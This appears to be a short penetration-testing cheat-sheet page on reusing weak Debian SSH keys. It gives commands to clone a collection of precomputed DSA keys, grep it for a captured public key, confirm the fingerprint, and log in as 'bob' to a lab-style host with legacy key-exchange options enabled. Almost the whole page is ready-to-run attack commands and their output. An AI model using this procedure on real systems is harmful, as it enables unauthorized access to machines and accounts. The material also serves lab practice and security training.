# SSH Authorized\_key reuse

{% embed url="https://github.com/g0tmi1k/debian-ssh" %}

{% embed url="https://gitbook.brainyou.stream/basic-linux/ssh-key-predictable-prng-authorized_keys-process" %}

<pre class="language-bash" data-overflow="wrap"><code class="lang-bash"><strong>#check /var/backups get ssh/authorized_keys &#x26; known_hosts
</strong>
git clone https://github.com/g0tmi1k/debian-ssh
tar vjxf debian-ssh/common_keys/debian_ssh_dsa_1024_x86.tar.bz2
cd debian-ssh/common_keys/dsa/1024/
grep -lr 'AAAAB3NzaC1kc3MAAACBAOgzzMCD3Im5bRnAVdV3yLwTsyNAi3IiFShIfx9' #(characters after ssh-dss in pub key file)

#find key fingerprint:
f1fb2162a02f0f7c40c210e6167f05ca-16858.pub

ssh-keygen -l -f f1fb2162a02f0f7c40c210e6167f05ca-16858.pub
1024 SHA256:pazdjoHxCGr2tjH16FVEvuwUTtHte8xK1EJ2nmWSHx4  (DSA)

ssh -i dsa/1024/f1fb2162a02f0f7c40c210e6167f05ca-16858 bob@10.11.1.136 -o KexAlgorithms=+diffie-hellman-group1-sha1 -o HostKeyAlgorithms=+ssh-rsa
or
ssh -i f1fb2162a02f0f7c40c210e6167f05ca-16858 bob@10.11.1.136 -o KexAlgorithms=+diffie-hellman-group1-sha1 -o HostKeyAlgorithms=+ssh-rsa
</code></pre>
